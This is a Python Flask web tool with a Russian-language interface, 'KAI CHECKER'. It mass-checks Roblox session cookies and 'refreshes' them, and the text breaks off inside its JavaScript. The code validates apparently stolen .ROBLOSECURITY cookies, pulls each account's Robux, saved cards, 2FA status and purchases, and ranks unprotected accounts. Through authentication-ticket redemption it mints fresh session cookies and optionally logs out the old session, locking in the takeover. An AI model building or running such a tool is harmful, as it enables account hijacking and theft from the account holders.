import os
import time
import logging
import re
import urllib3
import html
import sys
import asyncio
import zipfile
from datetime import datetime, timezone, timedelta
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO
from curl_cffi.requests import AsyncSession

# ===== НАСТРОЙКИ =====
os.makedirs("downloads", exist_ok=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

# ============================================================
# ПОЛНЫЙ ЧЕКЕР ИНФОРМАЦИИ
# ============================================================

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'TotalRAP': 0, 'Created': '?', 'Country': '?',
        'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False,
        'SecurityStatus': '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)',
        'Cookie': cookie,
        'PurchasedGamepasses': {},
        'RareItems': [],
        'CreditCardsCount': 0,
        'IsPremium': False,
        'DonationTotal': 0
    }
    try:
        cleaned_cookie = cookie.strip()
        if ".ROBLOSECURITY=" in cleaned_cookie:
            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]

        import requests
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        })
        
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                info['UserID'] = d.get('id')
                info['Username'] = d.get('name')
                info['status'] = '✅'
            else:
                info['status'] = '❌'
                return info
        else:
            info['status'] = '❌'
            return info
            
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        # ===== БЕЗОПАСНОСТЬ И КАРТЫ =====
        d = g('https://www.roblox.com/my/settings/json')
        if d:
            security = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = security.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = security.get('IsPhoneSet', False)
            billing = d.get('BillingModel', {})
            info['CreditCardsCount'] = len(billing.get('SavedPaymentMethods', []))

        # ===== ПРЕМИУМ =====
        prem = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if prem and prem.get('isSubscribed', False):
            info['IsPremium'] = True

        # ===== ДАТА СОЗДАНИЯ =====
        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        # ===== ROBUX =====
        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        # ===== СТРАНА =====
        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        # ===== ГЕЙМПАССЫ И ДОНАТ =====
        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            total_donated = 0
            
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    price = abs(item.get('currency', {}).get('amount', 0))
                    total_donated += price
                    item_type = str(details.get('type', ''))
                    if price >= 50 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
                        name = details.get('name', 'Товар')
                        place_info = details.get('place', {})
                        place_name = place_info.get('name', 'Другие игры')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            
            info['PurchasedGamepasses'] = gamepasses_dict
            info['DonationTotal'] = total_donated
        except Exception as e:
            logger.error(f"Gamepass error: {e}")

        # ===== СТАТУС БЕЗОПАСНОСТИ =====
        security_score = 0
        if info.get('EmailSet'): security_score += 1
        if info.get('TwoFactorEnabled'): security_score += 2
        if info.get('AccountPinEnabled'): security_score += 1
        if info.get('PhoneSet'): security_score += 1

        if security_score >= 4:
            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
        elif security_score >= 2:
            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
        else:
            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
    except Exception as e:
        logger.error(f"Err: {e}")
        info['status'] = '❌'
    return info

# ============================================================
# ФОРМАТИРОВАНИЕ ОТЧЁТОВ
# ============================================================

def format_short_report(info):
    if info['status'] != '✅':
        return f"❌ {info['Username']} — невалидный кук"
    
    gp = info.get('PurchasedGamepasses', {})
    total_gp_robux = sum(p['price'] for passes in gp.values() for p in passes)
    
    r = f"📋 {info['Username']} [{info['UserID']}]\n"
    r += f"🟢 VALID | 🆔 {info['UserID']}\n\n"
    r += f"📅 {info['Created']} | 🌍 {info['Country']} | {'✅ Premium' if info['IsPremium'] else '❌ Premium'}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"💎 RAP: {'❌ Нет' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}\n\n"
    r += f"🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"   📧 Почта: {'✅' if info['EmailSet'] else '❌'}\n"
    r += f"   🔐 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    r += f"   {info['SecurityStatus']}\n"
    r += f"   💳 Карты: {info['CreditCardsCount']} | 📦 Предметы: {len(info.get('RareItems', []))}\n\n"
    
    if gp:
        r += f"📦 ГЕЙМПАССЫ ({total_gp_robux:,} R$):\n"
        for game, passes in list(gp.items())[:3]:
            game_total = sum(p['price'] for p in passes)
            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:6]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 6:
                r += f"      └ ...и ещё {len(passes)-6}\n"
    else:
        r += "📦 ГЕЙМПАССЫ: ❌ Нет\n"
    
    r += "\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n\n"
    r += f"{info['Cookie']}"
    return r

def generate_full_txt_report(info):
    if info['status'] != '✅':
        return f"❌ {info['Username']} — невалидный кук\nCookie: {info['Cookie']}"
    
    gp = info.get('PurchasedGamepasses', {})
    
    r = "╔══════════════════════════════════════════════════════════╗\n"
    r += "║  🎮 ROBLOX COOKIE CHECK REPORT                           ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📋 {info['Username']}                                   ║\n"
    r += f"║  🟢 ✅ | 🆔 {info['UserID']}                            ║\n"
    r += f"║  📅 {info['Created']} | 🌍 {info['Country']}             ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 Robux: ⏣ {info['Robux']:,}                           ║\n"
    r += f"║  💸 Донат: ⏣ {info['DonationTotal']:,}                   ║\n"
    r += f"║  💎 RAP: {'❌ No' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}                           ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📧 Почта: {'Да' if info['EmailSet'] else 'Нет'} | 🔐 2FA: {'Да' if info['TwoFactorEnabled'] else 'Нет'}      ║\n"
    r += f"║  ⭐ Premium: {'Да' if info['IsPremium'] else 'Нет'} | 💳 Карты: {info['CreditCardsCount']}          ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  🔫 ГЕЙМПАССЫ ПО ИГРАХ                                   ║\n"
    
    if gp:
        for game, passes in gp.items():
            game_total = sum(p['price'] for p in passes)
            r += f"║  🎮 {game} (Total: {game_total:,} R$):           ║\n"
            for p in passes:
                r += f"║    └ {p['name']} ({p['price']} R$)               ║\n"
    else:
        r += "║  🎮 ГЕЙМПАССЫ: ❌ Нет                                    ║\n"
        
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  🍪 COOKIE (скопируй ниже):                              ║\n"
    r += "╚══════════════════════════════════════════════════════════╝\n\n"
    r += f"{info['Cookie']}\n\n"
    r += f"Generated: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
    return r

# ============================================================
# ФРЕШЕР (ИСПРАВЛЕННЫЙ)
# ============================================================

async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple:
    if not HAS_CFFI:
        return False, None, "❌ Установите curl_cffi"
    
    clean_old = old_cookie.strip()
    if ".ROBLOSECURITY=" in clean_old:
        clean_old = clean_old.split(".ROBLOSECURITY=")[1].split(";")[0]

    headers_base = {
        "Cookie": f".ROBLOSECURITY={clean_old}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/"
    }
    
    async with AsyncSession(impersonate="chrome120") as session:
        csrf_token = None
        for url in ["https://auth.roblox.com/v2/logout", "https://www.roblox.com/home"]:
            try:
                r = await session.post(url, headers=headers_base, timeout=10) if "logout" in url else await session.get(url, headers=headers_base, timeout=10)
                csrf_token = r.headers.get("x-csrf-token")
                if not csrf_token:
                    match = re.search(r"setToken\('(.*?)'\)", r.text)
                    if match:
                        csrf_token = match.group(1)
                if csrf_token:
                    break
            except:
                pass
        
        if not csrf_token:
            return False, None, "❌ CSRF не получен"

        ticket_headers = headers_base.copy()
        ticket_headers.update({"x-csrf-token": csrf_token, "RBXAuthenticationNegotiation": "1"})
        ticket = None
        for _ in range(3):
            try:
                r = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=10)
                ticket = r.headers.get("rbx-authentication-ticket")
                if ticket:
                    break
            except:
                pass
        
        if not ticket:
            return False, None, "❌ Ticket не получен"

        new_cookie = None
        for _ in range(3):
            try:
                r = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
                                      headers={
                                          "User-Agent": "Roblox/WinInet", 
                                          "Referer": "https://www.roblox.com/",
                                          "RBXAuthenticationNegotiation": "1"
                                      }, 
                                      json={"authenticationTicket": ticket}, timeout=10)
                set_cookie = r.headers.get("set-cookie", "")
                if ".ROBLOSECURITY=" in set_cookie:
                    parts = set_cookie.split(".ROBLOSECURITY=")
                    if len(parts) > 1:
                        new_cookie = parts[1].split(";")[0]
                        if new_cookie:
                            break
            except:
                pass
        
        if not new_cookie:
            return False, None, "❌ Новый кук не получен"

        if kill_old:
            try:
                await session.post("https://auth.roblox.com/v2/logout", headers=ticket_headers, timeout=5)
            except:
                pass

        return True, new_cookie, "✅ Успешно"

def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple:
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
    except Exception as e:
        return False, None, f"[ERROR] {e}"

# ============================================================
# ВЕБ-СЕРВЕР И ИНТЕРФЕЙС
# ============================================================

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KAI CHECKER</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,600;0,700;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; pointer-events: auto; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            padding: 24px;
            background: #0b081a;
            background-image: radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
        }
        .kai-wrapper {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px;
            background: rgba(18, 10, 40, 0.95);
            backdrop-filter: blur(16px);
            border: 2px solid #6c5ce7;
            border-radius: 32px;
            box-shadow: 0 0 60px rgba(108, 92, 231, 0.25);
            position: relative;
            z-index: 1;
        }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #0d0722; border-radius: 8px; }
        ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 8px; }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px 0 16px; border-bottom: 1px solid #2a1a50;
            margin-bottom: 30px; position: relative; z-index: 10;
        }
        .logo {
            font-family: 'Poppins', sans-serif;
            font-size: 34px; font-weight: 900; font-style: italic;
            background: linear-gradient(135deg, #c084fc, #f472b6);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .logo span { font-weight: 400; font-style: normal; -webkit-text-fill-color: #a78bfa; }

        .tabs {
            display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 28px; position: relative; z-index: 10;
        }
        .tab {
            padding: 10px 24px; background: rgba(26, 16, 64, 0.8);
            border: 1px solid #2a1a50; border-radius: 40px; color: #9880c0;
            cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.25s;
            user-select: none; position: relative; z-index: 10;
        }
        .tab:hover { border-color: #a855f7; color: #fff; transform: translateY(-2px); }
        .tab.active {
            border-color: #c084fc; background: rgba(168, 85, 247, 0.25);
            color: #c084fc; box-shadow: 0 0 20px rgba(168,85,247,0.2);
        }

        .tab-content { display: none; position: relative; z-index: 5; }
        .tab-content.active { display: block; animation: fadeUp 0.3s ease; }
        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(12px); } 100% { opacity: 1; transform: translateY(0); } }

        .card {
            background: rgba(18, 10, 40, 0.8); backdrop-filter: blur(12px);
            border: 1px solid #2a1a50; border-radius: 20px; padding: 28px 30px;
            margin-bottom: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); position: relative; z-index: 5;
        }
        .card h2 {
            font-family: 'Poppins', sans-serif; font-weight: 700; font-style: italic;
            font-size: 20px; color: #d4c0ff; margin-bottom: 18px; display: flex; align-items: center; gap: 10px;
        }

        .btn {
            padding: 12px 28px; border: none; border-radius: 40px; font-size: 14px; font-weight: 700;
            cursor: pointer; transition: all 0.25s; display: inline-flex; align-items: center; gap: 10px;
            text-decoration: none; position: relative; z-index: 100;
        }
        .btn-primary {
            background: linear-gradient(135deg, #a855f7, #d946ef); color: #fff;
            box-shadow: 0 8px 24px rgba(168,85,247,0.25);
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(168,85,247,0.4); color: #fff; }
        .btn-secondary { background: rgba(255,255,255,0.06); border: 1px solid #2a1a50; color: #d4c0ff; }
        .btn-secondary:hover { background: rgba(255,255,255,0.1); }

        textarea, .upload-area {
            width: 100%; padding: 14px 16px; background: #0d0722; border: 1px solid #2a1a50;
            border-radius: 14px; color: #ffffff; font-family: 'Inter', monospace; font-size: 14px;
            resize: vertical; transition: 0.2s; position: relative; z-index: 10;
        }
        textarea:focus, .upload-area:focus-within {
            border-color: #a855f7; outline: none; box-shadow: 0 0 0 3px rgba(168,85,247,0.2);
        }
        .upload-area {
            min-height: 100px; display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; border-style: dashed; gap: 6px; text-align: center; color: #ffffff;
        }

        .result-box {
            background: #0d0722; border: 1px solid #2a1a50; border-radius: 16px; padding: 18px;
            margin-top: 20px; max-height: 500px; overflow-y: auto; overflow-x: auto;
            font-family: 'Inter', monospace; font-size: 13px; color: #ffffff; white-space: pre-wrap; word-break: break-word; position: relative; z-index: 10;
        }

        .progress-bar {
            margin-top: 12px; background: #0d0722; border-radius: 40px; height: 6px; overflow: hidden; border: 1px solid #1a1040;
        }
        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #a855f7, #ec4899); transition: width 0.3s ease; }

        .fresh-card {
            background: rgba(12, 12, 24, 0.9); border: 1px solid #1f1f3a; border-radius: 16px;
            padding: 24px; margin-bottom: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.6); position: relative; z-index: 10;
        }
        .fresh-header {
            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 18px;
        }
        .fresh-header h2 {
            font-family: 'Poppins', sans-serif; font-weight: 700; font-style: italic; font-size: 22px; color: #e8e0ff; margin: 0;
        }
        .method-group {
            display: flex; gap: 6px; background: #0a0a18; padding: 4px; border-radius: 40px; border: 1px solid #1a1a2e; position: relative; z-index: 20;
        }
        .method-btn {
            padding: 8px 20px; border: none; border-radius: 30px; background: transparent; color: #6a6a8a;
            font-size: 13px; font-weight: 600; cursor: pointer; transition: 0.2s; position: relative; z-index: 20;
        }
        .method-btn.active {
            background: linear-gradient(135deg, #6c5ce7, #a855f7); color: #fff; box-shadow: 0 4px 16px rgba(108,92,231,0.3);
        }
        .fresh-textarea {
            width: 100%; min-height: 80px; padding: 14px 16px; background: #0a0a18; border: 1px solid #1a1a2e;
            border-radius: 12px; color: #ffffff; font-family: 'Inter', monospace; font-size: 14px; resize: vertical; position: relative; z-index: 20;
        }
        .fresh-controls {
            display: flex; flex-wrap: wrap; gap: 12px; align-items: center; margin-top: 16px; position: relative; z-index: 20;
        }
        .btn-start {
            background: linear-gradient(135deg, #00b894, #00a381); color: #fff; padding: 10px 32px; border: none;
            border-radius: 40px; font-weight: 700; font-size: 14px; cursor: pointer; position: relative; z-index: 20;
        }
        .btn-stop {
            background: #1a1a2e; color: #6a6a8a; padding: 10px 24px; border: 1px solid #2a2a4a;
            border-radius: 40px; font-weight: 600; font-size: 14px; cursor: pointer; position: relative; z-index: 20;
        }
        .btn-download {
            background: transparent; color: #6c5ce7; padding: 10px 20px; border: 1px solid #2a2a4a;
            border-radius: 40px; font-weight: 600; font-size: 14px; cursor: pointer; margin-left: auto; position: relative; z-index: 20;
        }
        .fresh-progress {
            margin-top: 16px; background: #0a0a18; border-radius: 40px; height: 8px; overflow: hidden; border: 1px solid #1a1a2e;
        }
        .fresh-progress .fill {
            height: 100%; width: 0%; background: linear-gradient(90deg, #6c5ce7, #a855f7, #ec4899); transition: width 0.3s ease;
        }
        .fresh-stats { display: flex; gap: 24px; margin-top: 10px; font-size: 13px; color: #6a6a8a; }
        .fresh-stats strong { color: #d0d0e0; }
        .fresh-stats .valid { color: #00b894; }
        .fresh-stats .invalid { color: #ff6b6b; }
        .cookie-output {
            background: #0a0a18; border: 1px solid #1a1a2e; border-radius: 12px; padding: 14px; display: flex; flex-direction: column; gap: 10px; position: relative; z-index: 20;
        }
        .cookie-output code { font-family: 'Inter', monospace; font-size: 12px; color: #ffffff; max-height: 150px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
        .copy-btn {
            align-self: flex-start; background: #6c5ce7; color: #fff; border: none; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 600; cursor: pointer; position: relative; z-index: 20;
        }
        .footer { text-align: center; padding: 30px 0 12px; color: #4a3a6a; font-size: 13px; border-top: 1px solid #1a1040; margin-top: 30px; }
    </style>
</head>
<body>

<div class="kai-wrapper">
    <div class="header">
        <div class="logo">KAI <span>CHECKER</span></div>
        <div style="display: flex; align-items: center; gap: 15px;">
            <span style="color: #c084fc; font-weight: 700; font-size: 14px; background: rgba(168, 85, 247, 0.15); padding: 4px 12px; border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 20px;">ПРОФФИ</span>
            <span id="sessionTimer" style="color: #00b894; font-family: 'Inter', monospace; font-weight: 600; font-size: 13px; background: rgba(0, 184, 148, 0.1); padding: 4px 10px; border-radius: 12px; border: 1px solid rgba(0, 184, 148, 0.2);">⏱️ 00:00:00</span>
            <div style="color:#4a3a6a; font-size:14px;">⚡ PRO</div>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="validator">✅ Валидатор</div>
        <div class="tab" data-tab="tools">🧰 Инструменты</div>
    </div>

    <!-- ===== ЧЕКЕР ===== -->
    <div class="tab-content active" id="tab-checker">
        <div class="card">
            <h2>🔍 Проверка куков (Массовая)</h2>
            <div style="display:flex; flex-wrap:wrap; gap:18px;">
                <div style="flex:2;">
                    <textarea id="manualCookies" placeholder="Вставь куки сюда (каждый с новой строки) ..." rows="6"></textarea>
                    <div style="margin-top:8px;color:#9880c0;font-size:13px;">или загрузи .txt файл с куками</div>
                </div>
                <div style="flex:1;">
                    <div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                        <p style="font-size:12px; color:#9880c0;">.ROBLOSECURITY</p>
                    </div>
                    <input type="file" id="fullFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить массовую проверку</button>
                <button class="btn btn-secondary" onclick="clearInputs()">🧹 Очистить</button>
            </div>
            <div class="progress-bar"><div class="fill" id="checkerProgress"></div></div>
            <div class="result-box" id="fullcheckResult">Результаты появятся здесь...</div>
        </div>
    </div>

    <!-- ===== ФРЕШЕР ===== -->
    <div class="tab-content" id="tab-fresher">
        <div class="fresh-card">
            <div class="fresh-header">
                <h2>🔄 Фрешер валид (Mass Refresher)</h2>
                <div class="method-group">
                    <button class="method-btn active" id="ticketMethod" onclick="setFreshMethod('ticket')">Ticket method</button>
                    <button class="method-btn" id="logoutMethod" onclick="setFreshMethod('logout')">Logout method</button>
                </div>
            </div>
            <textarea class="fresh-textarea" id="freshInput" placeholder="Вставь куки для обновления (по одному на строку)"></textarea>
            <div class="fresh-controls">
                <button class="btn-start" id="freshStartBtn" onclick="startFresh()">▶ Start</button>
                <button class="btn-stop" id="freshStopBtn" disabled onclick="stopFresh()">■ Stop</button>
                <button class="btn-download" onclick="downloadFreshResults()">📥 Download ZIP</button>
                <span class="fresh-status" id="freshStatus" style="color:#ffffff;">Ready</span>
            </div>
            <div class="fresh-progress"><div class="fill" id="freshProgressFill"></div></div>
            <div class="fresh-stats">
                <span>Progress: <strong id="freshProgressText">0%</strong></span>
                <span class="valid">✅ Valid: <strong id="freshValidCount">0</strong></span>
                <span class="invalid">❌ Invalid: <strong id="freshInvalidCount">0</strong></span>
            </div>
            <div id="freshResultWrapper" style="display:none; margin-top:16px;">
                <div class="cookie-output">
                    <code id="freshResultCode"></code>
                    <button class="copy-btn" id="freshCopyBtn">📋 Копировать</button>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== ВАЛИДАТОР ===== -->
    <div class="tab-content" id="tab-validator">
        <div class="card">
            <h2>✅ Валидатор (отсев мёртвых)</h2>
            <div class="upload-area" onclick="document.getElementById('validatorFile').click()">
                <p>📁 <strong>Загрузить .txt</strong></p>
            </div>
            <input type="file" id="validatorFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runValidator()" style="margin-top:14px;">🧪 Запустить</button>
            <div class="result-box" id="validatorResult">Здесь будет результат валидации...</div>
        </div>
    </div>

    <!-- ===== ИНСТРУМЕНТЫ ===== -->
    <div class="tab-content" id="tab-tools">
        <div class="card">
            <h2>📦 Инструменты обработки</h2>
            <p style="color: #9880c0; font-size: 14px;">Все операции доступны через автоматическую генерацию архивов.</p>
        </div>
    </div>

    <div class="footer">KAI CHECKER · PRO</div>
</div>

<script>
    let startTime = Date.now();
    setInterval(() => {
        let diff = Math.floor((Date.now() - startTime) / 1000);
        let h = String(Math.floor(diff / 3600)).padStart(2, '0');
        let m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
        let s = String(diff % 60).padStart(2, '0');
        const timerEl = document.getElementById('sessionTimer');
        if (timerEl) timerEl.textContent = `⏱️ ${h}:${m}:${s}`;
    }, 1000);

    function setupFileUpload(fileInputId, targetTextareaId) {
        const fileInput = document.getElementById(fileInputId);
        if (fileInput) {
            fileInput.addEventListener('change', function(e) {
                if (this.files && this.files[0]) {
                    const reader = new FileReader();
                    reader.onload = function(evt) {
                        const target = document.getElementById(targetTextareaId);
                        if (target) target.value = evt.target.result;
                    };
                    reader.readAsText(this.files[0]);
                }
            });
        }
    }
    setupFileUpload('fullFile', 'manualCookies');
    setupFileUpload('validatorFile', 'manualCookies');

    document.addEventListener('click', function(e) {
        if (e.target && e.target.id === 'freshCopyBtn') {
            const code = document.getElementById('freshResultCode');
            if (code && code.textContent) {
                navigator.clipboard.writeText(code.textContent).then(() => {
                    e.target.textContent = '✅ Скопировано!';
                    setTimeout(() => { e.target.textContent = '📋 Копировать'; }, 2000);
                });
            }
        }
    });

    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            const tabId = this.getAttribute('data-tab');
            if (!tabId) return;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            this.classList.add('active');
            const target = document.getElementById('tab-' + tabId);
            if (target) target.classList.add('active');
        });
    });

    let checkerHistory = [];

    async function runFullcheck() {
        const resBox = document.getElementById('fullcheckResult');
        const manual = document.getElementById('manualCookies').value.trim();
        const progress = document.getElementById('checkerProgress');
        
        if (!manual) {
            resBox.textContent = '❌ Вставь куки или загрузи .txt!';
            return;
        }

        const formData = new FormData();
        formData.append('file', new Blob([manual], { type: 'text/plain' }), 'manual.txt');

        resBox.textContent = '⏳ Массовая проверка аккаунтов запущена...';
        progress.style.width = '40%';
        
        try {
            const response = await fetch('/api/fullcheck', { method: 'POST', body: formData });
            const data = await response.json();
            progress.style.width = '100%';
            setTimeout(() => { progress.style.width = '0%'; }, 1000);
            
            if (data.success) {
                if (data.reports && data.reports.length) {
                    for (const report of data.reports) {
                        checkerHistory.push(report);
                    }
                }
                
                let html = `✅ Проверено аккаунтов: ${data.total} | Успешно валидных: ${data.valid_count}\n\n`;
                for (const report of checkerHistory) {
                    html += `${report}\n────────────────────────────────────────\n`;
                }
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="margin-top:10px; display:inline-block;">Скачать ZIP со всеми отчетами (.txt)</a>`;
                }
                resBox.innerHTML = html;
                resBox.scrollTop = resBox.scrollHeight;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Ошибка');
            }
        } catch (e) {
            resBox.textContent = '❌ Ошибка: ' + e.message;
            progress.style.width = '0%';
        }
    }

    function clearInputs() {
        document.getElementById('manualCookies').value = '';
        checkerHistory = [];
        document.getElementById('fullcheckResult').textContent = 'Результаты появятся здесь...';
    }

    let freshMethod = 'ticket';
    let freshRunning = false;
    let freshAbort = false;

    function setFreshMethod(method) {
        freshMethod = method;
        document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
        if (method === 'ticket') document.getElementById('ticketMethod').classList.add('active');
        else document.getElementById('logoutMethod').classList.add('active');
    }

    async function startFresh() {
        const input = document.getElementById('freshInput');
        const status = document.getElementById('freshStatus');
        const startBtn = document.getElementById('freshStartBtn');
        const stopBtn = document.getElementById('freshStopBtn');
        const progressFill = document.getElementById('freshProgressFill');
        const progressText = document.getElementById('freshProgressText');
        const validCount = document.getElementById('freshValidCount');
        const invalidCount = document.getElementById('freshInvalidCount');
        const resultWrapper = document.getElementById('freshResultWrapper');
        const resultCode = document.getElementById('freshResultCode');
        
        const cookies = input.value.trim().split('\n').filter(c => c.trim().length > 50);
        if (!cookies.length) { status.textContent = '❌ Нет куков'; return; }
        
        if (freshRunning) return;
        freshRunning = true;
        freshAbort = false;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        status.textContent = '⏳ Фрешим...';
        
        let valid = 0, invalid = 0;
        let newCookies = [];
        validCount.textContent = '0';
        invalidCount.textContent = '0';
        resultCode.textContent = '';
        resultWrapper.style.display = 'none';
        
        for (let i = 0; i < cookies.length; i++) {
            if (freshAbort) { status.textContent = '⏹️ Остановлено'; break; }
            const c = cookies[i].trim();
            const progress = Math.round(((i + 1) / cookies.length) * 100);
            progressFill.style.width = progress + '%';
            progressText.textContent = progress + '%';
            
            try {
                const r = await fetch('/api/fresh', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie: c, kill_old: freshMethod === 'logout' })
                });
                const data = await r.json();
                if (data.success && data.new_cookie) {
                    valid++;
                    newCookies.push(data.new_cookie);
                    validCount.textContent = valid;
                } else {
                    invalid++;
                    invalidCount.textContent = invalid;
                }
            } catch (e) {
                invalid++;
                invalidCount.textContent = invalid;
            }
            await new Promise(r => setTimeout(r, 150));
        }
        
        freshRunning = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
        status.textContent = '✅ Готово';
        
        if (newCookies.length) {
            resultCode.textContent = newCookies.join('\n');
            resultWrapper.style.display = 'block';
        }
    }

    function stopFresh() {
        freshAbort = true;
    }

    function downloadFreshResults() {
        const code = document.getElementById('freshResultCode');
        if (!code.textContent) return;
        const blob = new Blob([code.textContent], { type: 'text/plain' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
